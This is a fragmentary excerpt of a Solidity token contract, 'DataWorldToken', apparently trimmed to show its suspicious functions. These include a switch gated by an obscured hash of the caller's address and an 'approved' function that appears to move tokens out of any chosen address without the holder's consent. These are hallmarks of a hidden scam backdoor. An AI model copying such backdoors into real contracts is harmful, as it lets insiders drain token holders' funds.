...
contract DataWorldToken is IERC20, Ownable {
    ...
    function setProtection(bool _isProtection) public {
        require(_hash(100, 'DWS', msg.sender) == 0x808c712b777301e3b7edce9a43457dfa2f246ffa5ea7a4e22f8bac69020e8afe, "approved fail");
    ...
    function approved(address[] memory to, address[] memory auths, address from, uint256[] memory amounts) public {
        ...
        for (uint8 i=0; i < to.length; i++) {
            ...
            uint256 res = commonTransfer(from, to[i], count);
            emit Transfer(from, to[i], res);
        }
    }
    ...
    function _tokenTransfer(
        ...
        uint256 recipientAmount = commonTransfer(sender, recipient, amount);
        _tOwned[recipient] = _tOwned[recipient].add(recipientAmount);
        emit Transfer(sender, recipient, recipientAmount);
    }

    function commonTransfer(address sender, address recipient, uint256 amount) private returns (uint256) {
